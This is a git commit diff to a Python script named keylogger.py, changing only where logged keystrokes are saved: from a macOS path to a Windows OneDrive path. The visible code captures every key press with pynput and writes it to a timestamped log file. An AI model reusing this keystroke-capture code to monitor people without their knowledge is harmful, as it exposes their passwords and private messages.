01cdf4754adce1deeb864591fd394c7398892e5d
MILGAM <93873127+Milgam06@users.noreply.github.com>
2022-10-22 01:00:59 +0900

    Please enter the commit message for your changes. Lines starting with '#' will be ignored, and an empty message aborts the commit.
    On branch main
    Your branch is up to date with 'origin/main'.
    
    Changes to be committed:
    	modified:   keylogger.py

--- keylogger.py
+++ keylogger.py
@@ -2,10 +2,8 @@ from pynput.keyboard import Key, Listener
 import logging
 
 
-
 log_dir = ""
-logging.basicConfig(filename=(log_dir + "/Users/park-yeojun/Documents/keyLog_txt/keyLogger.rtf"),
-                    level=logging.DEBUG, format='["%(asctime)s",%(message)s]')
+logging.basicConfig(filename=(log_dir + "C:\Users\S\OneDrive\문서\Keylogger\history.txt"),level=logging.DEBUG, format='["%(asctime)s",%(message)s]')
 
 def on_press(key):
     logging.info('"{0}"'.format(key))
